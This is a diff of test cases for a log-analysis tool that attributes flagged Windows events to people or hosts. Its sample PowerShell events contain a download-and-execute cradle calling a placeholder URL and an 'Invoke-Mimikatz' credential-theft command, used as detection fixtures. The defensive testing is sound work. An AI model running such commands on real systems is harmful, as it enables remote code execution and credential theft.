@@ -212,6 +212,48 @@ def test_a_flag_on_a_host_that_names_no_one_is_a_host_story_and_false_positives_
     assert story["steps"][0]["tie"] == {"kind": "flag", "basis": "a finding on fs-002", "confidence": STRONG}
 
 
+def test_a_script_block_is_a_step_of_the_person_its_header_names():
+    """PowerShell names the user of a script block only by the SID in its System header; the logon joins it to them."""
+    sid = "S-1-5-21-111-222-333-1107"
+    host = "WS-004.northstar.example"
+    ps = {"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"}
+    events = [
+        ev(1, 0, eventId=4624, computer=host, targetUser="daniel.roy", targetDomain="NORTHSTAR", targetSid=sid, targetLogonId="0x9a01", logonType=2),
+        ev(2, 5, base=ps, eventId=4104, computer=host, userSid=sid, scriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://x')"),
+        ev(3, 6, base=ps, eventId=4104, computer=host, userSid="S-1-5-18", scriptBlockText="Invoke-Mimikatz"),
+    ]
+    findings = [finding("ps-download-cradle", "high", [2], tags=["execution"]), finding("ps-mimikatz", "high", [3], tags=["credential-access"])]
+    res = build_stories(events, [], findings, SETTINGS)
+    by_subject = {s["subject"]["id"] if s["kind"] == "host" else s["subject"]["label"]: s for s in res["stories"]}
+    assert set(by_subject) == {"northstar\\daniel.roy", "ws-004"}
+    [step] = [st for st in by_subject["northstar\\daniel.roy"]["steps"] if "event:2" in st["refs"]]
+    assert step["tie"]["kind"] == "flag" and step["tie"]["basis"] == "the record names them (user)"
+    # SYSTEM's script block names no one: it stays the host's
+    assert "event:3" in {r for st in by_subject["ws-004"]["steps"] for r in st["refs"]}
+
+
+def test_a_machine_account_or_a_service_is_never_a_storys_subject():
+    host = "WS-001.northstar.example"
+    fw = {"provider": "Microsoft-Windows-Windows Firewall With Advanced Security", "channel": "Microsoft-Windows-Windows Firewall With Advanced Security"}
+    events = [
+        # an SCCM client push: the site server's machine account opens ADMIN$, then its client is installed
+        ev(1, 0, eventId=4624, computer=host, targetUser="SCCM01$", targetDomain="NORTHSTAR", targetLogonId="0x88", logonType=3, ipAddress="10.0.0.20", workstation="SCCM01"),
+        ev(2, 0.1, eventId=5140, computer=host, subjectUser="SCCM01$", subjectDomain="NORTHSTAR", subjectLogonId="0x88", shareName="\\\\*\\ADMIN$", ipAddress="10.0.0.20"),
+        ev(3, 2, base=SCM, eventId=7045, computer=host, serviceName="ccmsetup", serviceFile="C:\\Windows\\ccmsetup\\ccmsetup.exe"),
+        # a firewall rule the firewall service's own SID added (ModifyingUser, read as the subject)
+        ev(4, 3, base=fw, eventId=2004, computer=host, subjectUser="S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052"),
+    ]  # fmt: skip
+    findings = [
+        finding("win-service-installed-suspicious", "high", [3], tags=["persistence"]),
+        finding("fw-rule-added", "medium", [4], tags=["defense-evasion"]),
+    ]
+    res = build_stories(events, [], findings, SETTINGS)
+    [story] = res["stories"]
+    assert story["kind"] == "host" and story["subject"]["id"] == "ws-001"
+    assert {"event:3", "event:4"} <= {r for st in story["steps"] for r in st["refs"]}
+    assert not res["identities"]
+
+
 def test_phases_from_tags_techniques_and_records():
     assert finding_phase({"tags": ["execution", "persistence"]}) == ("execution", "rule tag execution")
     assert finding_phase({"tags": ["defense-evasion"], "attack": ["T1027"]}) == ("stealth", "rule tag defense-evasion, technique T1027")
@@ -291,6 +333,46 @@ def test_a_server_case_selects_its_rows_by_sql_and_reads_the_same_story(registry
         assert _post({"storeKey": key, "findings": findings}).status_code == 403
 
 
+def test_a_server_case_reads_who_is_who_on_the_whole_case(registry):
+    """The rows read around the flags are a few days of the case; the accounts are those of all of it."""
+    from services.analysis.stories import stories_for_store
+
+    sid = "S-1-5-21-111-222-333-1107"
+    ps = {"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"}
+    events = [
+        # a week before, on another host: the logon that says whose SID it is
+        ev(1, -7 * 24 * 60, eventId=4624, computer="WS-009.northstar.example", targetUser="daniel.roy", targetDomain="NORTHSTAR", targetSid=sid, targetLogonId="0x10", logonType=2),
+        # a script block on WS-004 names its user only by that SID
+        ev(2, 0, base=ps, eventId=4104, computer="WS-004.northstar.example", userSid=sid, scriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://x')"),
+        # a task created by a bare 'admin': in the days read, WS-004's local admin is the only admin...
+        ev(3, 10, eventId=4698, computer="WS-004.northstar.example", subjectUser="admin", taskName="\\Updater"),
+        ev(4, 20, eventId=4624, computer="WS-004.northstar.example", targetUser="admin", targetDomain="WS-004", targetLogonId="0x20", logonType=2),
+        # ...but a month before, the domain has one too
+        ev(5, -30 * 24 * 60, eventId=4624, computer="WS-009.northstar.example", targetUser="admin", targetDomain="NORTHSTAR", targetLogonId="0x30", logonType=2),
+    ]  # fmt: skip
+    findings = [
+        finding("ps-download-cradle", "high", [2], tags=["execution"]),
+        finding("win-scheduled-task-suspicious-content", "high", [3], tags=["persistence"]),
+    ]
+    store = registry.get(str(uuid.uuid4()))
+    writer = EventWriter(store, 1, preserve_ids=True)
+    for e in events:
+        writer.add({**e, "recordKey": None})
+    writer.flush()
+    res = stories_for_store(store, SETTINGS, findings)
+    assert res["stats"]["events"] == 3 and res["stats"]["truncated"] == []
+    by_subject = {s["subject"]["label"]: s for s in res["stories"] if s["kind"] == "person"}
+    # the SID is daniel's, though the logon that says so is not among the rows read
+    assert "event:2" in {r for st in by_subject["northstar\\daniel.roy"]["steps"] for r in st["refs"]}
+    # a bare admin is either of two accounts: the story is of the bare name, not of WS-004's admin
+    assert "admin" in by_subject and "ws-004\\admin" not in by_subject
+    assert not [s for s in res["stories"] if s["kind"] == "host"]
+    # the rows read alone would have said otherwise
+    rows = [e for e in events if e["id"] in (2, 3, 4)]
+    alone = {s["subject"]["label"] for s in build_stories(rows, [], findings, SETTINGS)["stories"]}
+    assert "ws-004\\admin" in alone and "northstar\\daniel.roy" not in alone
+
+
 def test_the_browser_sends_every_field_the_story_engine_reads():
     """stories.ts sends only these fields of an event, and these keys of its data; a field read here
     and missing there would silently change a browser case's stories, so the lists are compared."""
@@ -305,7 +387,8 @@ def test_the_browser_sends_every_field_the_story_engine_reads():
         start = ts.index(f"export const {name}")
         return set(re.findall(r"'([^']+)'", ts[start : ts.index("] as const", start)]))
 
-    mail_only = {"date", "fromAddr", "fromName", "replyTo", "urls", "attachments", "messageId", "subject", "first", "n"}
+    # the mails' fields, and what records_for_store computes in SQL
+    mail_only = {"date", "fromAddr", "fromName", "replyTo", "urls", "attachments", "messageId", "subject", "first", "n", "hostDomain"}
     fields = set(re.findall(r"""\b(?:ev|row)\.get\(["']([A-Za-z]+)["']""", py)) - mail_only
     data = set(re.findall(r"""(?:\bdata|\bd|_data\(\w+\))\.get\(["']([A-Za-z. ]+)["']""", py))
     chain_keys = set(
